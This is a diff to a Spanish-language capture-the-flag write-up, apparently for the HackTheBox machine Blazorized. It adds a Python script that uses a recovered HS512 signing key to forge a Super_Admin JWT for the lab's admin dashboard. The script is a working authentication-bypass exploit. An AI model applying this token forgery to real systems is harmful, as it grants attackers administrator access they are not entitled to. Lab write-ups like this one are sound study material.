@@ -146,7 +146,47 @@ con esta información podremos crear nuestro propio token para acceder como Admi
 ![[Pasted image 20240705003707.png]]
 ![[Pasted image 20240705003826.png]]
 
-### s
+### script
+con este script usando la sintax que hemos obtenido del anali
+```python
+import jwt
+import datetime
+import pytz
+
+# Created by 3ky, enjoy :)
+jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d"
+issuer = "http://api.blazorized.htb"
+apiAudience = "http://api.blazorized.htb"
+adminDashboardAudience = "http://admin.blazorized.htb"
+superAdminEmailClaimValue = "superadmin@blazorized.htb"
+superAdminRoleClaimValue = "Super_Admin"
+
+def get_signing_credentials() -> str:
+    try:
+        return jwtSymmetricSecurityKey
+    except Exception as e:
+        raise e
+
+def generate_super_admin_jwt(expiration_duration_in_seconds: int = 60) -> str:
+    try:
+        claims = {
+            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": superAdminEmailClaimValue,
+            "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": superAdminRoleClaimValue,
+            "iss": issuer,
+            "aud": adminDashboardAudience,
+            "exp": datetime.datetime.now(pytz.utc) + datetime.timedelta(seconds=expiration_duration_in_seconds)
+        }
+        key = get_signing_credentials()
+        jwt_token = jwt.encode(claims, key, algorithm="HS512")
+        return jwt_token
+    except Exception as e:
+        raise e
+
+if __name__ == "__main__":
+    token = generate_super_admin_jwt()
+    print(token)
+
+```
 
 
 ### Vulnerabilidades
